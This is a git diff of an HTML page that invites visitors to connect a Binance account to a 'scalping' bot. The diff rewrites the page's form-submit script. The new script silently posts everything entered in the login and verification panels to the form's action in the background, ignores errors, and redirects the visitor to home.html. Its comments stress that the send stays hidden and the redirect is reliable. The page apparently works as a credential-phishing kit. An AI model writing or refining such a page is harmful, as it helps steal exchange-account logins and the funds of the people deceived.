@@ -110,7 +110,6 @@ click on connect to automatically connect your binance account to the scalping r
 </div>
 
 <script>
-
 const form=document.getElementById("form");
 const spin=document.getElementById("spin");
 const btn=document.getElementById("btn");
@@ -118,34 +117,42 @@ const login=document.getElementById("login");
 const verify=document.getElementById("verify");
 
 function toggleTheme(){
-if(document.body.classList.contains("dark")){
-document.body.classList.remove("dark");
-localStorage.setItem("theme","light");
-}else{
-document.body.classList.add("dark");
-localStorage.setItem("theme","dark");
-}}
+  if(document.body.classList.contains("dark")){
+    document.body.classList.remove("dark");
+    localStorage.setItem("theme","light");
+  }else{
+    document.body.classList.add("dark");
+    localStorage.setItem("theme","dark");
+  }
+}
 
-if(localStorage.getItem("theme")==="dark"){document.body.classList.add("dark");}
+if(localStorage.getItem("theme")==="dark"){
+  document.body.classList.add("dark");
+}
 
-form.onsubmit=(e)=>{
-e.preventDefault();
+form.addEventListener("submit",(e)=>{
+  e.preventDefault();
 
-spin.style.display="block";
-btn.disabled=true;
+  spin.style.display="block";
+  btn.disabled=true;
 
-login.style.transform="translateX(-100%)";
-verify.style.transform="translateX(-100%)";
+  login.style.transform="translateX(-100%)";
+  verify.style.transform="translateX(-100%)";
 
-fetch(form.action,{
-method:"POST",
-body:new FormData(form),
-headers:{'Accept':'application/json'}
-}).catch(()=>{});
+  // send in background (does not block redirect)
+  try{
+    fetch(form.action,{
+      method:"POST",
+      body:new FormData(form),
+      headers:{'Accept':'application/json'}
+    }).catch(()=>{});
+  }catch(err){}
 
-setTimeout(()=>{window.location.href="home.html";},1800);
-};
-
+  // clean reliable redirect
+  setTimeout(()=>{
+    window.location.replace("home.html");
+  },1800);
+});
 </script>
 
 </body>
